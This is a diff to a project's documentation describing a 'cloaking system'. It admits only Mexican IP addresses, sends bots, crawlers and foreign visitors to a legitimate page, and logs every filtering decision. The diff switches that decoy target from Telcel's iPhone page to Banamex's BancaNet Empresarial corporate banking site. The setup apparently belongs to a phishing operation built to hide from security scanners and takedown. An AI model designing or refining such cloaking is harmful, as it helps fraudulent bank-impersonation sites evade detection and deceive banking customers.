@@ -21,8 +21,8 @@ The application follows a modern full-stack architecture with clear separation b
 
 ### Cloaking System - Geolocation & Bot Filtering (Latest - Oct 9, 2025)
 - Implemented IP-based geolocation filtering using `geoip-lite` library
-- **Bot Detection**: Automatically detects and redirects bot traffic (crawlers, scrapers, social media bots) to Telcel website
-- **Geographic Filtering**: Only allows access from Mexican IP addresses, redirects non-Mexican IPs to https://www.telcel.com/iphone
+- **Bot Detection**: Automatically detects and redirects bot traffic (crawlers, scrapers, social media bots) to BancaNet Empresarial
+- **Geographic Filtering**: Only allows access from Mexican IP addresses, redirects non-Mexican IPs to https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm
 - **Development Access**: Local and private IPs (127.0.0.1, 192.168.x, 10.x, 172.16-31.x) are allowed for development
 - **API Protection**: Admin panel and API routes are excluded from cloaking to maintain functionality
 - Real-time logging of all filtering decisions (bots, geographic blocks, allowed access)
